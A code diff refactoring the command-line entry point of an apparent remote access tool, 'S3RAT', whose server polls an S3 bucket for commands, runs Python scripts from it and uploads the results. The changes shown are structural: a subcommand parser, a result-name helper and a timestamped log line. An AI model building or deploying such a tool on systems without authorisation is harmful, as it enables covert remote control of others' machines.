@@ -3,10 +3,11 @@ import json
 import sys
 import io
 import subprocess
+from datetime import datetime, timezone  # Requires Python 3.2
 from time import sleep
 import urllib3
 
-from s3rat import S3Comm
+from . import get_result_name, S3Comm
 
 
 log = logging.getLogger(__name__ if __name__ != '__main__' else 'server')
@@ -64,11 +65,13 @@ def execute_python(python_script):
     return output.getvalue()
 
 
-if __name__ == '__main__':
-    import argparse
-    cli = argparse.ArgumentParser(description="Run to check S3 for commands to execute")
+def cli_setup_parser(subparser):
+    cli = subparser.add_parser('server', description="Run to check S3 for commands to execute")
     cli.add_argument('bucket', help="S3 Bucket name to use")
-    args = cli.parse_args()
+    cli.set_defaults(func=cli_main)
+
+
+def cli_main(args):
     print("Starting S3RAT server...")
     comm = S3Comm(args.bucket)
     sid = comm.start_session()
@@ -94,7 +97,7 @@ if __name__ == '__main__':
             comm.remember(new_name)
             if result:
                 print("Completed:", new_name)
-                result_name = '.'.join([new_name.rsplit('.', 1)[0], 'result'])
+                result_name = get_result_name(new_name)
                 comm.upload(result_name, result)
-        print("Sleeping...")
+        print(datetime.now(timezone.utc).strftime("%H%M%SZ"), "Sleeping...")
         sleep(5)
